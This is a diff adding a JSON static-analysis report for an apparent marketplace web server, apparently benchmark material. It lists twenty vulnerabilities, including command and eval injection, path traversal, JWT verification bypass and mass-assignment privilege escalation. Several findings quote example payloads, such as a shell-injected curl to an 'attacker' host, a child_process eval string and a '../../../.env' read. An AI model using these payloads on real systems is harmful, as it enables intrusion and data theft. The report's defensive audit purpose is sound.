@@ -1,0 +1,516 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "server/src/controllers/productController.ts",
+      "start": {
+        "line": 616,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 616,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The vendor-supplied 'format' body field (validated only with notEmpty in product.routes.ts) is interpolated directly into a shell command string passed to execSync(). An authenticated vendor_manager can inject arbitrary shell metacharacters (e.g. format=`pdf; curl attacker/$(... )`) to achieve OS command execution on the server. Contrast with reviewController.exportVendorReviewDigestSafe / payoutController which use spawn() with an allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection",
+      "path": "server/src/controllers/reviewController.ts",
+      "start": {
+        "line": 359,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 360,
+        "col": 30,
+        "offset": 0
+      },
+      "extra": {
+        "message": "In exportVendorReviewDigest, the attacker-controlled 'outputType' body field is concatenated into a shell command executed with exec(). A vendor_manager can set outputType to something like `pdf; curl http://attacker/$(id)` (route POST /api/reviews/digest/export) causing OS command injection / RCE. The sibling exportVendorReviewDigestSafe shows the intended fix: spawn() without a shell plus an output-format allowlist.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-eval",
+      "path": "server/src/controllers/payoutController.ts",
+      "start": {
+        "line": 490,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 490,
+        "col": 88,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCommissionTierFormula passes the fully attacker-supplied rateExpression string into eval() after only replacing the literal 'amount'. Route POST /api/payouts/commission-tiers/preview (marketplace_admin) executes arbitrary JavaScript on the server, e.g. rateExpression=`require('child_process').execSync('id')`. The secure counterpart previewStandardCommissionTier evaluates only a fixed allow-listed formula selected by tierId, confirming this is an unsafe eval of untrusted input.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal",
+      "path": "server/src/controllers/categoryController.ts",
+      "start": {
+        "line": 173,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 174,
+        "col": 44,
+        "offset": 0
+      },
+      "extra": {
+        "message": "fetchCategoryMerchandisingAsset joins the user-controlled templateName query parameter directly into a filesystem path and reads it with fs.readFileSync without any containment check. GET /api/categories/merchandising-assets?templateName=../../../.env (marketplace_admin role) returns arbitrary readable files from the server. Note publishCategoryMerchandisingTemplate below does validate the resolved path stays under the base dir, but this read path does not.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal",
+      "path": "server/src/controllers/disputeController.ts",
+      "start": {
+        "line": 591,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 592,
+        "col": 50,
+        "offset": 0
+      },
+      "extra": {
+        "message": "archiveDisputeRecord builds the archive file path with path.join(caseArchiveDir, `${caseLabel}.txt`) using the fully user-supplied caseLabel body field, then writes to it with fs.writeFileSync. A support_agent/admin can set caseLabel like ../../../ledger-archive/<victimVendorId>-Q1 to overwrite arbitrary *.txt files outside the case-archive directory (path traversal write). caseLabel is only trimmed/notEmpty-validated, never sanitized.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.jwt-signature-verification-bypass",
+      "path": "server/src/middleware/partnerFeed.ts",
+      "start": {
+        "line": 28,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 39,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePartnerContext (used by GET /api/payouts/partner/feed) accepts tokens signed with the 'none' algorithm (algorithms: ['HS256','none']) and, on any verification failure, silently falls back to jwt.decode() which performs NO signature verification at all. An attacker can forge a token with an arbitrary vendorId (either alg=none or any garbage token) and read any vendor's payout feed (amounts, status, destination/payout account) \u2014 a full signature/auth bypass (CWE-347/CWE-290). Contrast resolveAuditPartnerContext which strictly verifies HS256 with a dedicated secret.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-290: Authentication Bypass by Spoofing",
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.missing-authentication",
+      "path": "server/src/controllers/webhookController.ts",
+      "start": {
+        "line": 136,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 176,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "receiveVerificationProcessorCallback (POST /api/webhooks/verification-processor/callback) is exposed with NO authentication and trusts client-supplied headers x-processor-vendor-id / x-processor-decision / x-processor-risk-score to flip a VendorProfile into 'active' or 'rejected'. Any anonymous attacker can approve their own (or a collaborator's) rejected/pending vendor, or reject/deny any other vendor \u2014 a broken-access-control / missing-authentication flaw. No shared secret, HMAC, or signature from the processor is validated.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.auth.missing-authentication",
+      "path": "server/src/controllers/webhookController.ts",
+      "start": {
+        "line": 182,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 227,
+        "col": 3,
+        "offset": 0
+      },
+      "extra": {
+        "message": "receiveVerificationProcessorCallbackStrict (POST /api/webhooks/verification-processor/callback-strict) is equally unauthenticated and trusts the same spoofable headers. The only added check is that riskScore is an integer, which an attacker trivially satisfies (decision='approved', risk-score='0'). This lets any unauthenticated caller set an arbitrary vendor's status to active or rejected.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.mass-assignment-privilege-escalation",
+      "path": "server/src/controllers/userController.ts",
+      "start": {
+        "line": 257,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 271,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "syncDisplayPreferences parses whatever JSON is in the client-controllable 'display_prefs' cookie and feeds EVERY parsed key directly into prisma.user.update data (Object.assign of parsedPreferences). Because the User model exposes sensitive columns such as role and isActive, an authenticated buyer can set cookie display_prefs={\"role\":\"marketplace_admin\"} and POST /api/users/me/display-preferences/sync to escalate their own account to marketplace_admin. This is a mass-assignment privilege escalation. Compare notificationController.syncNotificationDigestPreferences which validates input with a strict zod schema.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-269: Improper Privilege Management"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.mass-assignment",
+      "path": "server/src/controllers/userController.ts",
+      "start": {
+        "line": 381,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 384,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "amendOrderShippingDetails (PUT /api/orders/:id/shipping-details, buyer role) spreads the whole client req.body into the prisma.order.update data along with the existing order. An order-owning buyer can therefore overwrite any Order column, e.g. set status:'fulfilled' or 'refunded', total/subtotal/tax to arbitrary values (or negative), buyerId, tracking fields, etc. This mass assignment bypasses the intended field restriction (contrast amendOrderDeliveryInstructions which whitelists shippingMethod/trackingNumber/notes).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.integrity-missing",
+      "path": "server/src/controllers/orderController.ts",
+      "start": {
+        "line": 566,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 587,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyStoreCreditVoucher decrypts the client-supplied voucherToken with aes-256-cbc using an attacker-controlled IV and NO message authentication (no HMAC/GCM tag). The first 16-byte plaintext block can be arbitrarily rewritten by choosing the IV, and there is no validation that voucher.amount is positive/bounded or that the voucher is bound to this order/user. A buyer who obtains one valid voucher can forge tokens with an arbitrary discount amount and drain/negate order totals. The safe sibling applyLoyaltyPointsVoucher uses authenticated aes-256-gcm with setAuthTag, confirming the intended fix.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-353: Missing Support for Integrity Check",
+            "CWE-327: Use of a Broken or Risky Cryptographic Algorithm"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.denial-of-service.unbounded-pagination",
+      "path": "server/src/controllers/productController.ts",
+      "start": {
+        "line": 642,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 665,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateInventorySnapshot pages through every product of an arbitrary user-chosen category in a while loop with no upper bound on accumulated records (the MAX_SNAPSHOT_RECORDS constant at line 23 is defined but never applied). A vendor_manager/admin can request a snapshot for a large category and force the server to accumulate an unbounded in-memory array and return a huge payload, enabling memory-exhaustion DoS. Compare payoutController.generateVendorStatementDigest which caps results with MAX_STATEMENT_RECORDS.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-770: Allocation of Resources Without Limits or Throttling",
+            "CWE-400: Uncontrolled Resource Consumption"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection",
+      "path": "server/src/controllers/staffDirectoryController.ts",
+      "start": {
+        "line": 17,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 66,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory concatenates the raw user-supplied 'q' query parameter into an LDAP search filter (`(cn=*${q}*)`) with no escaping, enabling LDAP filter injection (e.g. q=`*)(objectClass=*))(|(cn=*`) to bypass the intended search scope and enumerate directory entries. Note findStaffByEmail properly escapes its input via escapeFilterValue(), and audit.routes restricts this to support_agent/admin. The directory client is stubbed in this repo but is described as delegating to ldapjs in production.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: Improper Neutralization of Data within XPath Expressions / LDAP Injection"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.public-status-filter-leak",
+      "path": "server/src/controllers/productController.ts",
+      "start": {
+        "line": 71,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 75,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The public, unauthenticated GET /api/products endpoint (product.routes.ts line 33) accepts a client-supplied 'status' query parameter (no allowlist; only 'published' is forced when status is absent). listProducts therefore returns draft/pending_review/rejected/archived products (prices, inventory counts, vendor/category refs) of every vendor to anonymous users, and GET /api/products/:id (getProductDetail) also returns any status. Unpublished data is disclosed to the public.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.public-moderation-queue-leak",
+      "path": "server/src/controllers/reviewController.ts",
+      "start": {
+        "line": 111,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 119,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The public GET /api/reviews endpoint has no authentication and honors a client-supplied status filter. Calling /api/reviews?status=pending_review (or flagged/rejected) returns the moderation queue: review bodies, ratings, and buyer identities that were never published/approved. listReviews only defaults to 'published' when status is omitted, so pending/unpublished content is fully exposed to anonymous users.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-200: Exposure of Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.access-control.unprotected-static-uploads",
+      "path": "server/src/index.ts",
+      "start": {
+        "line": 40,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 46,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The whole uploads directory (path.resolve(UPLOAD_PATH)) is served by express.static with no authentication, while sensitive artifacts are written beneath it: dispute evidence and case archives (uploads/disputes, uploads/case-archive), case dossiers (uploads/dossiers), payout ledger snapshots with amounts (uploads/ledger-archive, e.g. `<vendorId>-<label>.csv` from exportVendorLedgerSnapshot), and review/catalog exports. File names are often predictable from public data (vendor.id is exposed by the product/storefront APIs), so any party can fetch another vendor's payout ledger or dispute evidence without authorization.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-552: Files or Directories Accessible to External Parties",
+            "CWE-284: Improper Access Control"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ssti-handlebars",
+      "path": "server/src/controllers/notificationController.ts",
+      "start": {
+        "line": 165,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 170,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "broadcastCustomVendorAnnouncement compiles a fully vendor-supplied 'layout' string with Handlebars.compile(layout) and renders it (POST /api/notifications/vendor-announcement/custom, any vendor_manager). Compiling an untrusted template is a template-injection (SSTI) sink and lets a vendor read/abuse the render context via crafted expressions such as {{lookup ...}} / prototype traversal; the fixed counterpart broadcastStandardVendorAnnouncement compiles only the constant STANDARD_ANNOUNCEMENT_TEMPLATE, confirming layout must not be user-controlled. The endpoint also lets a vendor push arbitrary announcement content to any recipientId including admins.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine",
+            "CWE-94: Improper Control of Generation of Code"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.hardcoded-credentials.jwt-secret",
+      "path": "server/src/middleware/auth.ts",
+      "start": {
+        "line": 8,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 8,
+        "col": 75,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The JWT secret falls back to the well-known constant 'marketplace-jwt-secret-dev-only' (identical fallback in authController.ts:8, adminController.ts:7, and vendorController.ts:8). If JWT_SECRET is not set in the environment, anyone can forge a valid session token for any user \u2014 including role marketplace_admin \u2014 and fully bypass authentication. The partner-feed secret also defaults to an empty string (partnerFeed.ts:5).",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-exposure.stack-trace",
+      "path": "server/src/controllers/orderController.ts",
+      "start": {
+        "line": 653,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 671,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateOrderDiagnostics toggles verbose error disclosure purely on a client-supplied query flag (includeInternals=true). When enabled, any error returns error.message, error.stack, and req.params to the caller, exposing internal stack traces, absolute paths, and runtime details to support_agent/admin sessions that merely set the flag (CWE-209). Review diagnostics generateReviewDiagnostics gates the same stack leak on NODE_ENV=development; this endpoint does not.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-random-secret",
+      "path": "server/src/controllers/userController.ts",
+      "start": {
+        "line": 289,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 292,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "provisionIntegrationKey generates a personal API key from Math.random() (two substring slices of base36), which is not cryptographically secure and yields low entropy, making keys guessable/forgeable. The vendor counterpart provisionServiceKey correctly uses crypto.randomBytes(24) \u2014 a secure generator \u2014 for the same kind of credential.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
